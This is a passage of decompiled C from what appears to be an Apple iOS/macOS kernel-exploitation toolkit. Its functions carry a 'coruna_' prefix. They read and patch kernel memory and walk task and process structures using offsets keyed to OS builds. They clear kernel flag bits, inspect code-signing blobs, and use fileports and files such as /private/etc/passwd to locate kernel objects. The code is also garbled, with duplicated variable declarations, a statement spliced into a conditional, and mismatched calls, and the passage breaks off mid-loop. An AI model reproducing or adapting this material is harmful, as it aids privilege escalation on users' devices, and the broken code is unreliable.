  uint64_t cache_45;
  uint64_t cache_46;
  uint64_t cache_73;
  uint64_t cache_47;
  uint64_t cache_48;
  uint64_t cache_49;
  long cache_74;
  
  cache_74 = *(long *)k_kernel_stack_chk_guard_slot;
  ptr = (uint *)*handle;
  status = (int *)handle[1];
  type_id_9 = *(unsigned long *)(ptr + 0x56);
  if ((*ptr & 0x5584001) != 0 || 0x1f52ffffffffff < type_id_9) {
    cache_41 = (void *)0x0;
    cache_39 = (void *)0x0;
    cache_27 = 0xffffffff;
    cache_26 = 0;
    cache_25 = 0;
    cache_21 = 0;
    cache_22 = 0;
    cache_23 = 0;
    action = 0;
    err = coruna_bzero_8(status,&cache_41,&cache_39,&cache_26,&cache_25,&cache_21);
    if (err == 0) {
fail:
      port = 0;
      *(uint *)(handle + 2) = port;
      if (*(long *)k_kernel_stack_chk_guard_slot != cache_74) {
      ___stack_chk_fail();
      }
      return;
    }
    cache_32 = -1;
    if (((((char)status[0x18] != '\0') || (*(unsigned long *)(status + 10) >> 0x1d == 0)) ||
        (((status[0x13] == cache_26 && ((status[0x15] == cache_25 || (cache_21 != 0)))) &&
         ((status[0x16] == cache_21 || (*(unsigned long *)(ptr + 0x56) < 0x1f530000000000)))))) &&
       ((addr = coruna_helper_16fd0_34c1c(ptr,status[0x11]), addr != 0 &&
        (err = coruna_kernel5_residual_260(ptr,&stack_guard,&block_ctx), err != 0)))) {
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(ptr,addr + (unsigned long)block_ctx,8,&cache_36);
      if (err != 0) {
        if (((long)cache_36 < 0x20000000) || ((char)status[0x18] != '\0')) {
          err = coruna_kernel509_residual_307(ptr,addr + (unsigned long)stack_guard,&cache_24);
          if ((err == 0) ||
             (err = coruna_open_dev_null_32320(ptr,cache_24,&cache_22,&cache_23,&cache_27),
             status = 5;
             if (cache_32 != -1) {
             coruna_kernel509_via_kernel5_via_bzero_5(cache_29);
             }
             port = cache_27;
             err = status;
             if (cache_27 != 0xffffffff) {
             if ((cache_22 != 0) && (cache_23 != 0)) {
             flags = coruna_call_mach_vm_machine_attribute_1d4f8_2b508(ptr);
             err = 5;
             if (flags != 0) {
             err = status;
             }
             }
             _close(port);
             }
             if (cache_41 != (void *)0x0) {
             _free(cache_41);
             }
             port = (uint)(err == 0);
             *(uint *)(handle + 2) = port;
             if (*(long *)k_kernel_stack_chk_guard_slot != cache_74) {
             ___stack_chk_fail();
             }
             return;
        }
        else {
          count = 0;
          serial_buf = cache_36;
load_ok_26:
          str = cache_39;
          if (cache_39 <= *(void **)(status + 4)) {
            err = coruna_fn_ptr_cast_10(ptr,0x5184001);
            if (err == 0) {
              err = coruna_kernel509_via_fn_ptr_cast_10_15(ptr,*(uint64_t *)(status + 6),cache_41,str);
            }
            else {
              err = coruna_vm_deallocate_112cc(ptr,*(uint64_t *)(status + 6),cache_41,str);
            }
            if (err != 0) {
load_ok_28:
              type_id_9 = *(unsigned long *)(ptr + 0x56);
              if ((type_id_9 < 0x1f530000000000) || ((*ptr & 0x5184001) == 0))
              status = 0;
              if (cache_32 != -1) {
              coruna_kernel509_via_kernel5_via_bzero_5(cache_29);
              }
              port = cache_27;
              err = status;
              if (cache_27 != 0xffffffff) {
              if ((cache_22 != 0) && (cache_23 != 0)) {
              flags = coruna_call_mach_vm_machine_attribute_1d4f8_2b508(ptr);
              err = 5;
              if (flags != 0) {
              err = status;
              }
              }
              _close(port);
              }
              if (cache_41 != (void *)0x0) {
              _free(cache_41);
              }
              port = (uint)(err == 0);
              *(uint *)(handle + 2) = port;
              if (*(long *)k_kernel_stack_chk_guard_slot != cache_74) {
              ___stack_chk_fail();
              }
              return;
            }
          }
        }
      }
    }
cleanup:
    status = 5;
    if (cache_32 != -1) {
    coruna_kernel509_via_kernel5_via_bzero_5(cache_29);
    }
    port = cache_27;
    err = status;
    if (cache_27 != 0xffffffff) {
    if ((cache_22 != 0) && (cache_23 != 0)) {
    flags = coruna_call_mach_vm_machine_attribute_1d4f8_2b508(ptr);
    err = 5;
    if (flags != 0) {
    err = status;
    }
    }
    _close(port);
    }
    if (cache_41 != (void *)0x0) {
    _free(cache_41);
    }
    port = (uint)(err == 0);
    *(uint *)(handle + 2) = port;
    if (*(long *)k_kernel_stack_chk_guard_slot != cache_74) {
    ___stack_chk_fail();
    }
    return;
  }
  cache_38 = 0;
  cache_39 = (void *)0x0;
  cache_37 = 0xffffffff;
  cache_36 = 0x20000000;
  cache_28 = 0;
  cache_27 = 0;
  cache_22 = 0;
  cache_23 = 0;
  cache_21 = 0;
  err = coruna_fn_ptr_cast_10(ptr,0x5184001);
  port = 0;
  *(uint *)(handle + 2) = port;
  if (*(long *)k_kernel_stack_chk_guard_slot != cache_74) {
  ___stack_chk_fail();
  }
  return;
}
void coruna_bzero_8(long handle,uint64_t *val,unsigned long *arg,uint *size,uint *flags_2,
                 uint *count_3)
{
  uint u;
  int err;
  uint32_t *ptr;
  void *ptr;
  uint size;
  unsigned long version;
  long handle;
  int status;
  uint *buf;
  long *buf;
  uint *str;
  uint port;
  uint *copy;
  long addr;
  unsigned long tag;
  int flags;
  uint kind;
  
  if (*(int *)(handle + 0x30) == 0) {
    kind = 0;
    size = *(uint *)(*(long *)(handle + 0x38) + 4);
    size = (size & 0xff00ff00) >> 8 | (size & 0xff00ff) << 8;
    size = size >> 0x10 | size << 0x10;
    flags = 0xc;
  }
  else {
    if (*(int *)(handle + 0x30) != 1) {
      return;
    }
    buf = *(uint **)(handle + 0x38);
    size = *buf;
    version = (unsigned long)size;
    if (size == 0) {
      kind = 0;
      status = 0xc;
    }
    else {
      buf = (long *)(*(long *)(buf + 2) + 8);
      tag = version;
      port = 0;
      do {
        kind = port;
        if (((int)buf[-1] == *(int *)(handle + 0x40)) &&
           (kind = *(uint *)(*buf + 0x28), (kind & 0x3fff) != 0 || kind == 0)) {
          kind = port;
        }
        buf = buf + 2;
        tag = tag - 1;
        port = kind;
      } while (tag != 0);
      buf = (long *)(*(long *)(buf + 2) + 8);
      status = 0xc;
      do {
        port = kind;
        if ((int)buf[-1] != 5 || kind == 0) {
          port = (*(uint *)(*buf + 4) & 0xff00ff00) >> 8 |
                   (*(uint *)(*buf + 4) & 0xff00ff) << 8;
          port = port >> 0x10 | port << 0x10;
        }
        status = status + 8 + port;
        buf = buf + 2;
        version = version - 1;
      } while (version != 0);
    }
    err = *(uint *)(handle + 0x5c) - size;
    flags = err * 8;
    if (*(uint *)(handle + 0x5c) < size || err == 0) {
      flags = 0;
    }
    size = flags + status;
    flags = flags + 0xc;
  }
  version = (unsigned long)size;
  ptr = _malloc(version);
  if (ptr != (uint32_t *)0x0) {
    _bzero(ptr,version);
    if (*(int *)(handle + 0x30) == 1) {
      buf = *(uint **)(handle + 0x38);
      *ptr = 0xc00cdefa;
      port = (*buf & 0xff00ff00) >> 8 | (*buf & 0xff00ff) << 8;
      size = (size & 0xff00ff00) >> 8 | (size & 0xff00ff) << 8;
      ptr[1] = size >> 0x10 | size << 0x10;
      ptr[2] = port >> 0x10 | port << 0x10;
      if (*buf != 0) {
        addr = 0;
        tag = 0;
        handle = *(long *)(buf + 2);
        copy = ptr + 4;
        size = flags + *buf * 8;
        do {
          flags = *(int *)(handle + addr);
          if (flags == *(int *)(handle + 0x40)) {
            *size = size;
            flags = *(int *)(handle + addr);
          }
          str = flags_2;
          if ((flags == 5) || (str = count_3, flags == 7)) {
            *str = size;
          }
          port = *(uint *)(handle + addr);
          port = (port & 0xff00ff00) >> 8 | (port & 0xff00ff) << 8;
          u = (size & 0xff00ff00) >> 8 | (size & 0xff00ff) << 8;
          copy[-1] = port >> 0x10 | port << 0x10;
          *copy = u >> 0x10 | u << 0x10;
          ptr = *(void **)((uint *)(handle + addr) + 2);
          port = *(uint *)((long)ptr + 4);
          port = (port & 0xff00ff00) >> 8 | (port & 0xff00ff) << 8;
          u = port >> 0x10 | port << 0x10;
          _memcpy((void *)((long)ptr + (unsigned long)size),ptr,(unsigned long)u);
          handle = *(long *)(buf + 2);
          port = kind;
          if (kind == 0 || *(int *)(handle + addr) != 5) {
            port = u;
          }
          size = port + size;
          tag = tag + 1;
          addr = addr + 0x10;
          copy = copy + 2;
        } while (tag < *buf);
      }
      *val = ptr;
      *arg = version;
    }
    else {
      size = *(uint *)((long)*(void **)(handle + 0x38) + 4);
      size = (size & 0xff00ff00) >> 8 | (size & 0xff00ff) << 8;
      _memcpy(ptr,*(void **)(handle + 0x38),(unsigned long)(size >> 0x10 | size << 0x10));
      *val = ptr;
      *arg = version;
      *size = 0;
    }
  }
  return;
}
void coruna_open_dev_null_32320(long handle,long addr_2,long *off_3,long *ctx_4,int *flags)
{
  int err;
  int status;
  int flags;
  long handle;
  long addr;
  long off;
  long base;
  uint32_t scratch;
  uint32_t bootargs;
  uint32_t thread_attr;
  uint host_info;
  long serial_buf;
  unsigned long action;
  long block_ctx;
  
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    block_ctx = 0;
    action = action & 0xffffffff00000000;
    err = *(int *)(handle + 0x140);
    if (err < 0x1f53) {
      if (err != 0x1809 && err != 0x1c1b) {
        return;
      }
    }
    else if (1 < err - 0x1f53U && err != 0x2258) {
      return;
    }
    err = _open("/dev/null",0);
    if (-1 < err) {
      status = coruna_fileport_makeport(err,&action);
      if (status == 0) {
        off = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4(handle,action & 0xffffffff);
        if (off != 0) {
          off = off + 0x38;
          status = coruna_kernel509_residual_307(handle,off,&block_ctx);
          if ((status != 0) && (status = coruna_call_mach_vm_machine_attribute_1d4f8_2b508(handle,off,addr_2), status != 0)) {
            *flags = err;
            *off_3 = off;
            *ctx_4 = block_ctx;
            _mach_port_destroy(*(ipc_space_t *)k_kernel_mach_task_self_slot,
                               (mach_port_name_t)action);
            return;
          }
        }
        _mach_port_destroy(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)action)
        ;
      }
      _close(err);
    }
  }
  else {
    off = 0;
    *off_3 = 0;
    *ctx_4 = 0;
    action = 0;
    block_ctx = 0;
    serial_buf = 0;
    thread_attr = 0xffffffff;
    host_info = 0xffffffff;
    scratch = 0xffffffff;
    bootargs = 0xffffffff;
    err = *(int *)(handle + 0x140);
    base = 0x48;
    if (err < 0x2258) {
      addr = 0;
      if ((1 < err - 0x1f53U && err != 0x1809) && err != 0x1c1b) {
        return;
      }
    }
    else {
      addr = 0;
      if (err != 0x2258) {
        if ((err != 0x2712) && (err != 0x225c)) {
          return;
        }
        addr = 0x74;
        off = 0x40;
        base = 0x50;
      }
    }
    err = _open("/private/etc/passwd",0);
    while (-1 < err) {
      status = coruna_kernel509_via_fn_ptr_cast_2_14(handle,err,&block_ctx);
      if ((status != 0) || (status = coruna_kernel509_via_mach_vm_read_overwrite(handle,block_ctx + 0x54,&host_info), status == 0))
      break;
    }
    if (err != -1) {
fail:
      _close(err);
    }
  }
  return;
}
void coruna_kernel509_via_kernel5_residual_262_5(long handle,void *ctx)
{
  uint u;
  long handle;
  uint64_t size;
  uint scratch;
  uint8_t bootargs[48];
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  handle = coruna_kernel5_residual_262(handle,*(uint32_t *)(handle + 0x40),0xfade0c02);
  size = 0;
  if (handle != 0) {
    scratch = 0x30;
    u = (*(uint *)(handle + 4) & 0xff00ff00) >> 8 | (*(uint *)(handle + 4) & 0xff00ff) << 8;
    size = coruna_cc_sha256_update(*(uint8_t *)(handle + 0x25),handle,u >> 0x10 | u << 0x10,
                         bootargs,&scratch);
    if ((int)size != 0) {
      _memcpy(ctx,bootargs,(unsigned long)scratch);
      size = 1;
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != thread_attr) {
    ___stack_chk_fail(size);
  }
  return;
}
void coruna_kernel509_via_kernel509_via_fn_ptr_cast_10_15(uint64_t val,uint64_t id_2,unsigned long arg,uint64_t size_3,
                 uint64_t off_4)
{
  int err;
  long scratch;
  
  err = coruna_kernel509_residual_307(val,id_2,&scratch);
  if (err != 0) {
    do {
      err = coruna_kernel509_via_fn_ptr_cast_10_15(val,scratch + (arg & 0xffffffff),size_3,off_4);
      if (err == 0) {
        return;
      }
      err = coruna_kernel509_residual_307(val,scratch,&scratch);
      if (err == 0) {
        return;
      }
    } while (scratch != 0);
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_18(uint64_t val)
{
  coruna_fn_ptr_cast_10(val,0x5184001);
  return;
}
void coruna_fcntl_2435c(long handle)
{
  int err;
  int status;
  uint u;
  int *err;
  uint32_t scratch;
  unsigned long bootargs;
  uint32_t *thread_attr;
  uint64_t host_info;
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 0;
  bootargs = (unsigned long)(0x20000000 - *(int *)(handle + 0x180));
  thread_attr = &scratch;
  host_info = 4;
  err = _open("/usr/lib/dyld",0);
  if (err < 0) {
    ___error();
    err = ___error();
  }
  else {
    status = _fcntl(err,0x3b);
    if (status != 0) {
      ___error();
    }
    u = _close(err);
    err = (int *)(unsigned long)u;
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
    return;
  }
  ___stack_chk_fail(err);
}
void coruna_kernel5_residual_265(uint8_t *buf)
{
  uint u;
  
  *buf = 1;
  do {
    u = **(uint **)(buf + 0x18);
    if ((u >> 0x1a & 1) != 0) {
      **(uint **)(buf + 0x18) = u & 0xfbffffff;
      DataSynchronizationBarrier(2,3,0);
      return;
    }
  } while (buf[1] == '\0');
  return;
}
void coruna_fcntl_244b8(long handle,int *flags)
{
  int err;
  int *err;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t scratch;
  uint64_t thread_attr;
  uint64_t bootargs;
  uint8_t thread_attr;
  uint64_t host_info;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t block_ctx;
  uint64_t stack_guard;
  unsigned long sa_saved;
  uint64_t *sa_new;
  uint64_t path_buf;
  long tmp_buf;
  
  tmp_buf = *(long *)k_kernel_stack_chk_guard_slot;
  stack_guard = 0;
  block_ctx = 0;
  block_ctx = 0;
  action = 0;
  action = 0;
  serial_buf = 0;
  serial_buf = 0;
  host_info = 0;
  host_info = 0;
  scratch = k_kernel_rodata_word_437a0;
  bootargs = 0x20200;
  _uStack_a0 = coruna_cat((char)*(uint32_t *)k_kernel_vm_page_shift_slot,0x22000000000);
  scratch = 0;
  thread_attr = 0;
  sa_saved = (unsigned long)(0x20000000 - *(int *)(handle + 0x180));
  sa_new = &scratch;
  path_buf = 0x70;
  err = _fcntl(*flags,0x3b);
  if ((err != 0) && (err = ___error(), *err == 1)) {
    ___error();
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != tmp_buf) {
    ___stack_chk_fail();
  }
  return;
}
void coruna_mach_thread_self(uint8_t *buf)
{
  unsigned long *ptr;
  long handle;
  uint u;
  uint size;
  uint version;
  uint port;
  char err;
  mach_port_t lm8;
  int err;
  unsigned long tag;
  long addr;
  unsigned long kind;
  unsigned long type_id;
  unsigned long *buf;
  
  addr = *(long *)(buf + 8);
  kind = *(unsigned long *)(buf + 0x20);
  type_id = *(unsigned long *)(buf + 0x30);
  buf = *(unsigned long **)(buf + 0x48);
  lm8 = _mach_thread_self();
  err = coruna_call_mach_timebase_info(lm8);
  if (err != 0) {
    version = *(uint *)(buf + 0x38);
    u = 0x3700;
    if (version != 0) {
      u = version + 8;
    }
    size = 0x3300;
    if (version != 0) {
      size = version;
    }
    *buf = 1;
    version = size;
joined_r0x00032cac:
    do {
      if (version < u) {
        ptr = (unsigned long *)(addr + (unsigned long)version);
        if (((((*ptr < 0xffff000000000001 || (*ptr & type_id) != 0) ||
              (*(int *)((long)ptr + -4) != 0)) ||
             (tag = ptr[-2],
             (tag < kind || kind + 0x4000 <= tag) || (tag & 7) != 0)) ||
            ((*(int *)(addr + (tag & 0x3fff)) != 0 ||
             (ptr[-3] < 0xffff000000000001 || (ptr[-3] & 0xf) != 0)))) ||
           (handle = (tag & 0x3fff) + 4, (*(uint *)(addr + handle) & 0xfffcc0f9) != 1)) {
          version = version + 8;
          goto joined_r0x00032cac;
        }
        if (kind == *buf) {
          *ptr = *(unsigned long *)(buf + 0x10);
          err = buf[0x28];
          while ((err == '\0' && (port = *(uint *)(addr + handle), (port & 0x1000001) == 1))) {
            if ((port >> 0x1a & 1) != 0) {
              *(uint *)(addr + handle) = port & 0xfbffffff;
            }
            err = buf[1];
          }
          buf[1] = 1;
          *(uint *)(buf + 0x3c) = version;
        }
        else {
          buf[1] = 1;
        }
      }
      version = size;
    } while (buf[1] == '\0');
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_19(long handle,uint *size)
{
  uint u;
  uint size;
  int err;
  uint version;
  int status;
  long handle;
  
  status = coruna_fn_ptr_cast_10(handle,0x5184001);
  if ((status == 0) || (u = *size, u < 0x1ff9)) {
    coruna_mach_port_request_notification_29a50(handle,size);
  }
  else {
    size = *(uint *)(handle + 0x180);
    version = 0;
    if (size != 0) {
      version = u / size;
    }
    err = u - version * size;
    status = 0;
    if (err != 0) {
      status = size - err;
    }
    handle = coruna_mach_port_destroy(handle,status + u);
    if (handle != 0) {
      *size = status + u;
    }
  }
  return;
}
void coruna_kernel5_via_bzero_5(uint *size)
{
  unsigned long u;
  long handle;
  
  if (*size != 0) {
    u = 0;
    handle = 8;
    do {
      coruna_bzero(*(uint64_t *)(*(long *)(size + 2) + handle));
      u = u + 1;
      handle = handle + 0x10;
    } while (u < *size);
  }
  _free(*(void **)(size + 2));
  _free(size);
  return;
}
void coruna_kernel5_residual_266(uint *size,uint32_t size_x,uint64_t val)
{
  uint32_t *ptr;
  void *ptr;
  uint u;
  
  u = *size;
  if (u < size[1]) {
    ptr = *(void **)(size + 2);
  }
  else {
    u = size[1] << 1;
    ptr = _realloc(*(void **)(size + 2),(unsigned long)u << 4);
    if (ptr == (void *)0x0) {
      return;
    }
    size[1] = u;
    *(void **)(size + 2) = ptr;
    u = *size;
  }
  ptr = (uint32_t *)((long)ptr + (unsigned long)u * 0x10);
  *ptr = size_x;
  *(uint64_t *)(ptr + 2) = val;
  *size = u + 1;
  return;
}
void coruna_kernel509_residual_312(void)
{
  uint64_t *ptr;
  void *ptr;
  
  ptr = _malloc(0x10);
  if (ptr != (uint64_t *)0x0) {
    ptr = _malloc(0x40);
    if (ptr == (void *)0x0) {
      _free(ptr);
    }
    else {
      ptr[1] = ptr;
      *ptr = k_kernel_rodata_word_437a8;
    }
  }
  return;
}
void coruna_pread(int flags,long handle,unsigned long arg,long addr_2)
{
  bool err;
  unsigned long u;
  int *err;
  unsigned long size;
  uint version;
  
  if (arg != 0) {
    size = 0;
    while( true ) {
      version = 0;
      while (u = _pread(flags,(void *)(handle + size),arg - size,size + addr_2),
            u == 0xffffffffffffffff) {
        err = ___error();
        if ((*err != 4) || (err = 99 < version, version = version + 1, err)) break;
      }
      if ((long)u < 0) break;
      if (arg < u) {
        return;
      }
      err = CARRY8(u,size);
      size = u + size;
      if (err) {
        return;
      }
      if (arg < size) {
        return;
      }
      if (arg <= size) {
        return;
      }
    }
fail:
    ___error();
    ___error();
  }
  return;
}
void coruna_fn_ptr_cast_6(void)
{
  return;
}
void coruna_kernel509_via_fn_ptr_cast_2_4(long handle,uint64_t val)
{
  int err;
  long handle;
  unsigned long u;
  uint32_t scratch;
  long bootargs;
  
  err = coruna_kernel509_via_mach_vm_read_overwrite(handle,val,&scratch);
  if ((((err != 0) && (handle = coruna_fn_ptr_cast_6(handle,val), handle != 0)) &&
      (err = coruna_kernel509_residual_307(handle,handle,&bootargs), err != 0)) &&
     (handle = coruna_fn_ptr_cast_2(handle,bootargs), handle != 0)) {
    u = *(unsigned long *)(handle + 0x158);
    if (0x2711ffffffffff < u) {
      if (0x29 < (scratch & 0x3ff)) {
        return;
      }
      if ((1L << ((unsigned long)scratch & 0x3f) & 0x20068000000U) == 0) {
        return;
      }
      err = coruna_kernel509_residual_307(handle,bootargs + 0x30,&bootargs);
      if (err == 0) {
        return;
      }
      u = *(unsigned long *)(handle + 0x158);
    }
    if (((u < 0x1f530000000000) && ((scratch >> 2 & 1) != 0)) &&
       (err = coruna_kernel509_residual_307(handle,bootargs + *(int *)(handle + 0x168),&bootargs), err != 0)) {
      coruna_fn_ptr_cast_2(handle,bootargs);
    }
  }
  return;
}
void coruna_fn_ptr_cast_7(void)
{
  return;
}
void coruna_helper_24c44_333dc(void)
{
  return;
}
void coruna_processor_set_info(long handle)
{
  uid_t u;
  mach_port_t host;
  kern_return_t lk2;
  mach_msg_type_number_t scratch;
  integer_t bootargs [2];
  host_t thread_attr;
  processor_set_name_t host_info;
  
  thread_attr = 0;
  scratch = 2;
  if ((*(char *)(handle + 10) == '\0') || (u = _getuid(), u == 0)) {
    host = _mach_host_self();
    lk2 = _processor_set_default(host,&host_info);
    if (lk2 == 0) {
      lk2 = _processor_set_info(host_info,5,&thread_attr,bootargs,&scratch);
      _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,host_info);
    }
    if (lk2 != 0x35) {
      return;
    }
  }
  _mach_host_self();
  return;
}
void coruna_kernel509_residual_313(long handle)
{
  int err;
  bool err;
  uint32_t u;
  int status;
  
  if (*(int *)(handle + 0x174) == 0) {
    err = *(int *)(handle + 0x140);
    if (err < 0x1f54) {
      if (err == 0x1809) {
        u = 0xa8;
        if (*(unsigned long *)(handle + 0x158) < 0x18090a09600000) {
          u = 0xb0;
        }
      }
      else if (err == 0x1c1b) {
        u = 0xa8;
      }
      else {
        if (err != 0x1f53) {
          return;
        }
        u = 0xa0;
      }
    }
    else {
      if (err < 0x225c) {
        err = err == 0x1f54;
        status = 0x2258;
      }
      else {
        err = err == 0x225c;
        status = 0x2712;
      }
      if (!err && err != status) {
        return;
      }
      u = 0x90;
    }
    *(uint32_t *)(handle + 0x174) = u;
  }
  return;
}
void coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4(long handle,uint64_t val)
{
  int err;
  long handle;
  int status;
  
  err = *(int *)k_kernel_mach_task_self_slot;
  status = (int)val;
  if ((err != status) || (*(long *)(handle + 0x1b0) == 0)) {
    if (status == -1) {
      coruna_kernel509_via_kernel509_via_kernel509_via_fn_ptr_cast_2_4(handle);
    }
    else {
      handle = coruna_kernel509_via_kernel5_via_mach_ports_register(handle,err,val);
      if (((handle != 0) && (handle = coruna_kernel509_via_fn_ptr_cast_2_4(handle,handle), err == status && handle != 0)) &&
         (*(long *)(handle + 0x1b0) == 0)) {
        *(long *)(handle + 0x1b0) = handle;
      }
    }
  }
  return;
}
void coruna_kernel509_via_kernel509_via_kernel509_via_fn_ptr_cast_2_4(long handle)
{
  if (*(long *)(&k_kernel_slot_19d8 + handle) == 0) {
    if (*(long *)(&k_kernel_slot_19d0 + handle) == 0) {
      if ((*(int *)(&k_kernel_slot_191c + handle) != -1) &&
         ((*(int *)(&k_kernel_slot_191c + handle) != 0 || (1 < *(int *)(&k_kernel_slot_1918 + handle) + 1U))))
      {
        coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4();
      }
    }
    else {
      coruna_kernel509_via_fn_ptr_cast_2_4();
    }
  }
  return;
}
void coruna_call_helper_25fa0(uint64_t val,uint64_t id_2)
{
  coruna_kernel509_via_kernel5_via_mach_ports_register(val,*(uint32_t *)k_kernel_mach_task_self_slot,id_2);
  return;
}
void coruna_kernel509_via_fn_ptr_cast_2_5(long handle,long addr_2)
{
  bool err;
  bool status;
  int err;
  long handle;
  uint64_t scratch;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (err - 0x1f53U < 2) {
      err = 0x1f530f027ffffe < *(unsigned long *)(handle + 0x158);
      status = *(unsigned long *)(handle + 0x158) == 0x1f530f027fffff;
      handle = 0x308;
    }
    else {
      if (err == 0x1809) {
        handle = 800;
        err = coruna_kernel509_residual_307(handle,handle + addr_2,&scratch);
        if (err != 0) {
        coruna_fn_ptr_cast_2(handle,scratch);
        }
        return;
      }
      if (err != 0x1c1b) {
        return;
      }
      err = 0x1c1b19145ffffe < *(unsigned long *)(handle + 0x158);
      status = *(unsigned long *)(handle + 0x158) == 0x1c1b19145fffff;
      handle = 0x338;
    }
    if (!err || status) {
      handle = 0x330;
    }
  }
  else {
    if ((err != 0x2258 && err != 0x225c) && err != 0x2712) {
      return;
    }
    handle = 0x300;
  }
fail:
  err = coruna_kernel509_residual_307(handle,handle + addr_2,&scratch);
  if (err != 0) {
    coruna_fn_ptr_cast_2(handle,scratch);
  }
  return;
}
void coruna_kernel5_residual_268(long handle)
{
  int err;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (err - 0x1f53U < 2) {
      return;
    }
    if (err == 0x1809) {
      return;
    }
    if (err == 0x1c1b) {
      return;
    }
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_20(long handle)
{
  int err;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (err - 0x1f53U < 2) {
      err = coruna_fn_ptr_cast_10(handle,0x100000);
      if (err == 0) {
        coruna_fn_ptr_cast_10(handle,0x5584001);
      }
    }
    else if (err == 0x1809) {
      coruna_fn_ptr_cast_10(handle,0x5584001);
    }
    else if (err == 0x1c1b) {
      coruna_fn_ptr_cast_10(handle,0x5584001);
    }
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_21(long handle)
{
  int err;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x225c) {
    if (err - 0x1f53U < 2) {
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        return;
      }
      coruna_kernel509_via_fn_ptr_cast_10_20(handle);
      return;
    }
    if (err != 0x2258) {
      return;
    }
  }
  else if (err != 0x225c && err != 0x2712) {
    return;
  }
  err = coruna_fn_ptr_cast_10(handle,0x5100000);
  if (err == 0) {
    coruna_fn_ptr_cast_10(handle,0x5584001);
  }
  return;
}
void coruna_fn_ptr_cast_8(void)
{
  return;
}
void coruna_helper_254f0_33d18(void)
{
  return;
}
void coruna_helper_254f0_33d18_stub(void)
{
  coruna_helper_254f0_33d18();
  return;
}
void coruna_kernel509_via_kernel509_via_kernel509_via_fn_ptr_cast_2_4_2(long handle,uint64_t val)
{
  int err;
  
  if (*(int *)(handle + 0x140) < 0x2258) {
    err = coruna_kernel509_via_fn_ptr_cast_10_20();
  }
  else {
    err = coruna_kernel509_via_fn_ptr_cast_10_21();
  }
  if (err != 0) {
    coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4(handle,val);
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_2_6(long handle,long addr_2)
{
  uint u;
  int err;
  long scratch;
  
  u = coruna_kernel509_via_fn_ptr_cast_10_20();
  if ((((u != 0) && (*(int *)(handle + 0x140) < 0x2258)) &&
      (err = coruna_kernel509_residual_307(handle,(unsigned long)u + addr_2,&scratch), err != 0)) &&
     (scratch != 0)) {
    coruna_fn_ptr_cast_2(handle);
  }
  return;
}
void coruna_fn_ptr_cast_9(void)
{
  return;
}
void coruna_call_mach_vm_machine_attribute_1d4f8_34004(void)
{
  coruna_macho_data_seg_34040();
  return;
}
void coruna_macho_data_seg_34040(long handle,unsigned long arg,int flags,char *path)
{
  int err;
  unsigned long u;
  int status;
  int flags;
  unsigned long size;
  long handle;
  long addr;
  long off;
  unsigned long version;
  long base;
  int count;
  int scratch;
  unsigned long bootargs;
  long thread_attr;
  unsigned long host_info;
  long serial_buf;
  long action;

  action = *(long *)k_kernel_stack_chk_guard_slot;
  status = *(int *)(handle + 0x140);
  size = 0;
  if (path == (char *)0x0) {
    if (status < 0x2258) {
      if (*(long *)k_kernel_stack_chk_guard_slot == action) {
      return;
      }
      ___stack_chk_fail(size);
    }
    else {
      if (*(long *)k_kernel_stack_chk_guard_slot == action) {
      return;
      }
      ___stack_chk_fail(size);
    }
  }
  else if (status == 0x2258) {
    off = 0x381;
    addr = 0;
  }
  else {
    if (*(long *)k_kernel_stack_chk_guard_slot == action) {
    return;
    }
    ___stack_chk_fail(size);
  }
  status = coruna_fn_ptr_cast_9(handle);
  if (status == 0) {
done:
    size = 0;
  }
  else {
    err = *(int *)(handle + 0x168);
    if (*(long *)(&k_kernel_slot_19f8 + handle) == 0) {
      serial_buf = 0;
      version = 0;
      base = 0;
    }
    else {
      coruna_macho_find_loadcmd(&thread_attr,*(long *)(&k_kernel_slot_19f8 + handle),"__DATA");
      size = 0;
      if ((host_info == 0) || (version = host_info, base = thread_attr, serial_buf == 0))
      if (*(long *)k_kernel_stack_chk_guard_slot == action) {
      return;
      }
      ___stack_chk_fail(size);
    }
    count = 0;
    u = arg;
cleanup:
    do {
      bootargs = u;
      handle = coruna_kernel509_via_fn_ptr_cast_2_6(handle,bootargs);
      if (handle != 0) {
        if (path == (char *)0x0) {
          flags = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,handle + addr,4,&scratch);
          if (flags == 0) { size = 0; break; }
          size = bootargs;
          if (scratch == flags) break;
        }
        else {
          flags = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,handle + off,0x21,&thread_attr);
          if (flags == 0) { size = 0; break; }
          flags = _strncmp((char *)&thread_attr,path,0x21);
          size = bootargs;
          if (flags == 0) break;
        }
      }
      flags = coruna_kernel509_residual_307(handle,bootargs + (uint)(err + status),&bootargs);
      if (flags == 0) { size = 0; break; }
      bootargs = coruna_fn_ptr_cast_2(handle,bootargs);
      if (bootargs != 0) {
        if (((base != 0) && (version <= bootargs)) && (bootargs < version + serial_buf)) {
          flags = coruna_kernel509_residual_307(handle,bootargs,&bootargs);
          if (flags == 0) { size = 0; break; }
